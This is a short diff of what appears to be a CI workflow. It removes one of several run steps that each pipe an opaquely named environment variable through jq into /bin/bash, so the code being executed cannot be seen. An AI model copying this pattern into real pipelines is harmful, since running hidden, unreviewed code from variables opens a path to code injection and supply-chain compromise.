@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$s366" | jq -r .cxbig32 | /bin/bash
           printf '%s' "$cnjvt60028" | jq -r .jw1 | /bin/bash
-          printf '%s' "$vv66" | jq -r .iasil18652 | /bin/bash
           echo $xofq2 | jq -r .te86130 | /bin/bash
           echo $ccn53138 | jq -r .nkc5 | /bin/bash
           echo $wdha69 | jq -r .odidn445 | /bin/bash
